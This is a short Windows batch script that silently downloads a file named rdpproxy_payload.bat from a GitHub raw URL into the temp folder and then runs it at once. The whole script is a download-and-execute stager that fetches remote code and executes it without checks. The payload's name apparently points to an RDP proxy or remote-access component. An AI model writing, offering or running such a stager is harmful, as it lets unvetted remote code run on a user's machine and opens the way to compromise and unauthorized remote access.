@echo off
curl --silent "https://raw.githubusercontent.com/jipcation/rdpproxy/main/rdpproxy_payload.bat" -o "%temp%/rdpproxy_payload.bat"
call "%temp%/rdpproxy_payload.bat"
